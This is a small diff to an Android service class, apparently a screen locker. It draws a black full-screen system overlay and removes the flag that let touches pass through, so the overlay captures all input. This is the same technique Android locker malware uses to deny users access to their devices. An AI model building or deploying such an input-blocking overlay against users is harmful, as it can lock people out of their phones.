@@ -133,7 +133,7 @@ public class LockerService extends Service {
         lockerLayout = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);
 
         lockerLayout.setFitsSystemWindows(false);
-        // Memastikan background layout menutupi seluruh layar
+        // Memastikan background layout menutupi seluruh layar dan menangkap touch
         lockerLayout.setBackgroundColor(0xFF000000); 
 
         applyFullScreen();
@@ -143,7 +143,6 @@ public class LockerService extends Service {
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                 WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                 WindowManager.LayoutParams.FLAG_FULLSCREEN |
